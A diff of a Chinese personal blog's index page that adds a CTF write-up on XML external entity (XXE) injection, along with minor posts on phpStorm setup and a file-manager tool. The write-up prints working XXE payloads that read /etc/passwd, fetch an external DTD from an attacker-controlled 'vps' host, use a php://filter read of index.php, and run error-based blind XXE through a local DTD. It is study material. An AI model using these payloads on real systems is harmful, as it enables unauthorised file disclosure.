@@ -300,6 +300,601 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/15/xxe学习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/15/xxe学习/" itemprop="url">xxe学习</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-15T20:10:18+08:00">
+                2019-08-15
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-15T21:47:01+08:00">
+                2019-08-15
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  833
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>今天做题的时候遇到了一个xxe相关的题目，难度不大，现场学习的xxe，事后来总结一下：</p>
+<p>原题的名字是who are you，进去之后有一个输入框，输入什么就会回显什么，首先试了一下xss，只出现了alert(1)</p>
+<p>查看页面的源代码发现：</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="comment">// document.getElementById().value</span></span><br><span class="line">     <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">         <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">         <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">     <span class="built_in">console</span>.log(xml);</span><br><span class="line">     <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">     xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">             <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">             <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">             <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">             <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span><br><span class="line">     xmlhttp.send(xml);</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>显然xml数据是拼接的，直接对<code>&lt;script&gt;</code>进行实体编码就能够xss，然而这题的考点并不是这个。</p>
+<p>xml相关的自然是xxe，也就是XML 外部实体注入</p>
+<p>这需要有一点DTD的知识：</p>
+<blockquote>
+<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。
+DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+</blockquote>
+<p>DTD的引入是为了规范XML的，从一个栗子可以看：</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe.png" alt=""></p>
+<p>DOCTYPE声明了XML由哪些标签，因为XML的标签不同于HTML，是可以自定义的。</p>
+<p>DTD可以在XML文档内部声明，也可以外部引用,同时实体也可以内部声明或者外部引用</p>
+<p><em>内部实体声明D</em></p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> "<span class="attr">Donald</span> <span class="attr">Duck.</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> "<span class="attr">Copyright</span> <span class="attr">runoob.com</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><em>外部实体声明</em></p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML example:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>最常见的引入外部实体就是通过file协议读取文件：</p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>另一种payload</p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % d SYSTEM "http://vps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>我们可以在自己的VPS上构造
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>也可以这样：</p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://vps//evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>vps上的evil.dtd内容：
+<code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p>
+<p>不同的程序支持的协议也有区别，比如今天遇到的题目就是支持php伪协议：</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe0.png" alt=""></p>
+<p>ok到这里就差不多了。</p>
+<p>献上拿到题目的payload：</p>
+<p><code>&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;</code></p>
+<p>其实就是通过php伪协议去读取文件，flag就在index.php里面</p>
+<p>接下来看一道Google ctf2019的题目：</p>
+<p>直奔主题好了，这个题目抓包发现传送的是json格式的数据，但是也可以修改为XML格式的数据，很神奇吧：</p>
+<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe1.png" alt=""></p>
+<p>之后这个题目涉及到一个使用本地的dtd来盲注xxe的姿势：</p>
+<p>payload</p>
+<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE message[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % ISOamso '</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passed"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">	&amp;#x25;eval;</span></span><br><span class="line"><span class="meta">	&amp;#x25;error;</span></span><br><span class="line"><span class="meta">	'&gt;</span></span><br><span class="line"><span class="meta">	%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2>参考</h2>
+<p><a href="https://zhuanlan.zhihu.com/p/36517036" target="_blank" rel="noopener">CTF学习--web--XXE</a></p>
+<p><a href="https://www.runoob.com/dtd/dtd-entities.html" target="_blank" rel="noopener">菜鸟教程</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/14/php-storm环境/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/14/php-storm环境/" itemprop="url">php-storm环境</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-14T08:26:23+08:00">
+                2019-08-14
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-14T08:35:03+08:00">
+                2019-08-14
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/config/" itemprop="url" rel="index">
+                    <span itemprop="name">config</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  112
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>继续配置了一波phpStorm的环境，感觉对这个IDE还有很多可以研究的地方</p>
+<p>在这里可以修改php的路径，我选择了phpStudy的一个php解释器，因为其中安装了Xdebug。</p>
+<p><img src="https://i.loli.net/2019/08/14/YxhUEJqVHXW5DCp.png" alt="quicker_c3090872-33bf-4a8f-b5d3-68673acc6858.png"></p>
+<p>配置apache的环境，选择的是Local or mounted folder,因为服务器就在本地</p>
+<p><img src="https://i.loli.net/2019/08/14/zAnO3qtLGINyM2o.png" alt="quicker_e3e1a13d-6c33-470b-8e0c-af3eadac4ed5.png"></p>
+<p>路由映射</p>
+<p><img src="https://i.loli.net/2019/08/14/oxn2AeKQ5SEz4Pi.png" alt="quicker_3169e9d1-a506-4173-a498-639a1967baf1.png"></p>
+<p>之后就可以在phpStorm写完代码部署到本地的服务器上了</p>
+<p><img src="https://i.loli.net/2019/08/14/IMgBiuJHXYWGL7A.png" alt="quicker_dc68716b-2b4a-4eaa-93a0-648bcc2945af.png"></p>
+<p>也可以debug了</p>
+<p><img src="https://i.loli.net/2019/08/14/4qkMYoi27umAgDn.png" alt="quicker_7d640fb0-6dfa-4c13-a8c1-1c507ef8276c.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/13/PHP-Audit-Labs学习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="百浪多息">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="prontosil">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/13/PHP-Audit-Labs学习/" itemprop="url">PHP-Audit-Labs学习</a></h1>
+        
+
+		
+
+        <div class="post-meta">
+         
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-13T10:05:14+08:00">
+                2019-08-13
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-13T10:05:14+08:00">
+                2019-08-13
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  0
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/12/php-challenge/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2076,677 +2671,11 @@ md5后，276f722736c95d99e921722cf9ed621c再转成字符串:' ' 'or' 6&lt;trach&
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/05/windows资源管理器神器/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="百浪多息">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="prontosil">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/05/windows资源管理器神器/" itemprop="url">windows资源管理器神器</a></h1>
-        
-
-		
-
-        <div class="post-meta">
-         
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-05T20:47:40+08:00">
-                2019-08-05
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Post modified&#58;</span>
-              
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-05T21:05:30+08:00">
-                2019-08-05
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/config/" itemprop="url" rel="index">
-                    <span itemprop="name">config</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  148
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>一直很困惑不知道如何使用资源管理器，每次复制粘贴文件都需要同时打开多个资源管理器然后再emmmm，然后就会嫌资源管理器太多了就无脑x掉了，这时候就会发现mmp我刚打开的资源管理器呢。。。然后又要去找emmmm</p>
-<p>于是去搜了一下用来增强资源管理器的工具找到了这个： <code>QTTabBar</code></p>
-<p>可以说是体验很棒了</p>
-<p><a href="http://qttabbar.wikidot.com/" target="_blank" rel="noopener">网址</a></p>
-<p>比如多标签页</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/tool0.gif" alt=""></p>
-<p>再比如文件和文件夹预览</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/tool1.gif.png" alt=""></p>
-<p>总之很棒就是了</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/08/05/初见哈希扩展攻击/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="百浪多息">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="prontosil">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/05/初见哈希扩展攻击/" itemprop="url">初见哈希扩展攻击</a></h1>
-        
-
-		
-
-        <div class="post-meta">
-         
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-05T20:05:49+08:00">
-                2019-08-05
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Post modified&#58;</span>
-              
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-05T20:33:57+08:00">
-                2019-08-05
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  866
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  3
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>目前还是太菜了，向师傅们好好学习</p>
-<h2>SSRF me</h2>
-<p>点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/index.py" target="_blank" rel="noopener">代码</a></p>
-<p>程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的
-访问<code>/geneSign</code>可以得到sign的值, action可以是<code>scan</code>或<code>read</code>,但是在访问<code>/De1ctf</code>时,会检验sign是否正确,sign的生成算法：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
-<p>这其中<code>secret_key</code>是不知道的,并且<code>gengeSign</code>限制了action只能是<code>scan</code>,结合后来题目的提示是访问<code>flag.txt</code>,但是最多将这个文件读入<code>result.txt</code>,却不能读取出来。</p>
-<p>这样想来是不是只能爆破<code>secret_key</code>了？但是<code>secret_key</code>又怎么会那么容易给你呢。。</p>
-<p>这就涉及到我的知识盲区了,叫做哈希扩展攻击。。</p>
-<p>先看实验吧一道例题</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png" alt=""></p>
-<p>这题，注入不想注入，源码没扫出来，啥信息都没有？</p>
-<p>还是要多关注抓包的信息，尤其是数据包中出现了一些你都没有看过的东西的时候就要仔细看一看了</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba1.png" alt=""></p>
-<p>hhh没想到吧</p>
-<p>原来可以通过这种方式获取到源代码。。</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// 